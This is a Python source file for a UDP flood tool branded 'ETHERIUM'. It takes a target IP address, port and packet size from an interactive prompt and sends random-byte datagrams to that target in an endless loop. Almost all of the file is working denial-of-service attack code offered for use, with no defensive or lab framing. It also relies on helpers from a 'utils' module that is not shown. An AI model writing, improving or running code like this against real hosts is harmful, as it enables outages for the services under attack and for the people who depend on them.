import socket
import random
import os
from utils       import * 

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



def stresser(ip, port, size):


    attack = random._urandom(size)

    while True:
        try:
            connect.sendto(attack, (ip, port))
            print(f"{TYPE} Sending Packets To {Fore.LIGHTBLACK_EX}> {COLOR_L1} {ip}")
        except KeyboardInterrupt:
            print("Attack Canceled by User")
            break
        except ImportError:
            print("Python 2.7.15 is required")
            break

def main():
    while True:
        choice = input(f"                                        {COLOR_L}[{COLOR_L1}ETHERIUM{COLOR_L}] {COLORAMA_GRAY}| {COLOR_L}[{COLOR_L1}INPUT{COLOR_L}] {COLORAMA_GRAY}> {COLOR_WHITE}")

        if choice.lower() == "methods":
            os.system("cls") 
            stresser2()
            print(F"{TYPE} LAYER 4 | Ipv4")
            print(f"{TYPE} udp {COLORAMA_GRAY}<{COLOR_L1}ip{COLORAMA_GRAY}> {COLORAMA_GRAY}<{COLOR_L1}port{COLORAMA_GRAY}> {COLORAMA_GRAY}<{COLOR_L1}size{COLORAMA_GRAY}>{Fore.RESET}")
        

        elif choice.lower().startswith("udp"):
            try:

                _, ip, port, size = choice.split()
                port = int(port)
                size = int(size)


                stresser(ip, port, size)
            
            except ValueError:
                print(f"Invalid input. Use the format `udp <ip> <port> <size>`")
        
        else:
            print(f"Unknown command. Please use `methods` or `udp <ip> <port> <size>`")

if __name__ == "__main__":
    main()
